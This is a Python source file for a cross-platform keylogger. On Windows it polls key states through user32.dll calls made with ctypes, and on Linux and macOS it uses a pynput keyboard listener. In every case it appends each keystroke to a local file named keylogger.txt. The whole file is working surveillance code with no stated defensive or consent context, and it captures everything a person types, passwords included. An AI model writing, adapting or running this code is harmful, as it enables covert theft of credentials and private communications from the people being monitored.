import os
import platform
import time
import sys

LOG_FILE_PATH = "keylogger.txt"
PLATFORM = platform.system()

if PLATFORM == "Windows":
    import ctypes
    from ctypes import wintypes, POINTER, byref, create_unicode_buffer

    # Loading necessary Windows DLLs and functions
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    _get_async_key_state = user32.GetAsyncKeyState 
    _get_keyboard_state = user32.GetKeyboardState
    _map_virtual_key = user32.MapVirtualKeyW
    _to_unicode = user32.ToUnicode


    _get_async_key_state.argtypes = [wintypes.INT]
    _get_async_key_state.restype = wintypes.SHORT

    _get_keyboard_state.argtypes = [POINTER(wintypes.BYTE)]
    _get_keyboard_state.restype = wintypes.BOOL

    _map_virtual_key.argtypes = [wintypes.UINT, wintypes.UINT]
    _map_virtual_key.restype = wintypes.UINT

    _to_unicode.argtypes = [
        wintypes.UINT, wintypes.UINT, POINTER(wintypes.BYTE),
        wintypes.LPWSTR, ctypes.c_int, wintypes.UINT
    ]
    _to_unicode.restype = wintypes.INT

    def get_async_key_state(vkey: int) -> bool:
        ret = _get_async_key_state(vkey)
        return ret & 0x8000 != 0

    def get_keyboard_state(lpKeyState: POINTER(wintypes.BYTE)) -> bool:
        return bool(_get_keyboard_state(lpKeyState))

    def map_virtual_key(uCode: int, uMapType: int) -> int:
        return _map_virtual_key(uCode, uMapType)

    def to_unicode_func(wVirtKey: int, wScanCode: int, lpKeyState: POINTER(wintypes.BYTE), 
                        pwszBuff: wintypes.LPWSTR, cchBuff: int, wFlags: int) -> int:
        return _to_unicode(wVirtKey, wScanCode, lpKeyState, pwszBuff, cchBuff, wFlags)


def open_log_file(path: str) -> 'file':
    if not os.path.exists(path):
        with open(path, 'w'):
            pass
    return open(path, 'a')

# Windows Keylogger Implementation
def keylogger_windows():
    file = open_log_file(LOG_FILE_PATH)
    key_state = (wintypes.BYTE * 256)()
    buffer = create_unicode_buffer(2)
    last_key = None

    try:
        while True:
            for ascii_code in range(9, 255):
                if get_async_key_state(ascii_code):
                    if last_key == ascii_code:
                        continue
                    last_key = ascii_code

                    if not get_keyboard_state(key_state):
                        continue

                    virtual_key = map_virtual_key(ascii_code, 0)
                    ret = to_unicode_func(ascii_code, virtual_key, key_state, buffer, len(buffer), 0)

                    if ret > 0:
                        text = buffer.value[:ret]
                        file.write(text)
                        file.flush() 

                    time.sleep(0.01)
                else:
                    if last_key == ascii_code:
                        last_key = None

            time.sleep(0.01)
    finally:
        file.close()

# Unix Keylogger Implementation using pynput
def keylogger_unix():
    from pynput import keyboard

    file = open_log_file(LOG_FILE_PATH)

    def on_press(key):
        try:
            file.write(key.char)
        except AttributeError:
            file.write(str(key))
        file.flush() 

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

    file.close()


def main():
    if PLATFORM == "Windows":
        keylogger_windows()
    elif PLATFORM in ["Linux", "Darwin"]:
        keylogger_unix()
    else:
        print("Unsupported platform")
        sys.exit(1)

if __name__ == "__main__":
    main()
